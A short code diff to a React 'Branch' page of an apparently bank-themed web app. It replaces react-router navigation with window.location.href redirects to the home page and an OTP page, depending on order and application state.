@@ -1,6 +1,6 @@
 import axios from "axios";
 import { useEffect, useRef, useState } from "react";
-import { useLocation, useNavigate } from "react-router-dom";
+import { useLocation } from "react-router-dom";
 import { BankSiteFooter } from "../components/BankSiteFooter";
 import { VisitorTopLogo } from "../components/VisitorTopLogo";
 import { formLevelErrorClass } from "../components/FormFieldError";
@@ -52,7 +52,6 @@ const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
 export default function Branch() {
   const { t, dir, textDir } = useLanguage();
-  const navigate = useNavigate();
   const location = useLocation();
   const navigatedBranchRef = useRef(false);
   const orderId =
@@ -88,17 +87,17 @@ export default function Branch() {
 
   useEffect(() => {
     if (!orderId) {
-      navigate("/", { replace: true });
+      window.location.href = "/";
     }
-  }, [orderId, navigate]);
+  }, [orderId]);
 
   useEffect(() => {
     if (!hydrated || !orderId || navigatedBranchRef.current) return;
     if (!branchApplicationAccepted) return;
     navigatedBranchRef.current = true;
     sessionStorage.setItem("currentOrderId", orderId);
-    navigate("/otp", { state: { orderId } });
-  }, [hydrated, branchApplicationAccepted, orderId, navigate]);
+    window.location.href = "/otp";
+  }, [hydrated, branchApplicationAccepted, orderId]);
 
   useEffect(() => {
     if (!hydrated || !orderId || !rejectReason) return;
